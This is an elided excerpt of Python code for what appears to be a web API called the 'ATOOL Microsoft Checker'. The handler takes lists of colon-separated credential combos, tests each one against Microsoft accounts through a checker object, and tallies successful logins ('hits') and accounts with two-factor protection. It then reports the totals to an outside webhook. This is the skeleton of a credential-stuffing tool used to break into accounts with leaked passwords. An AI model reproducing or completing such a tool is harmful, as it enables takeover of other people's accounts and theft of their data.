...
class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            ...
            for combo in combos:
                status = checker.check(*combo.split(':', 1))
                if status == "HIT":
            ...
            if webhook:
                try:
                    requests.post(webhook, json={
                        "content": f"**ATOOL Check Done** Hits: {len(results['hits'])} | 2FA: {len(results['2fa'])}"
                    }, timeout=5)
                except:
                    pass
    ...
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"ATOOL Microsoft Checker API - Ready")
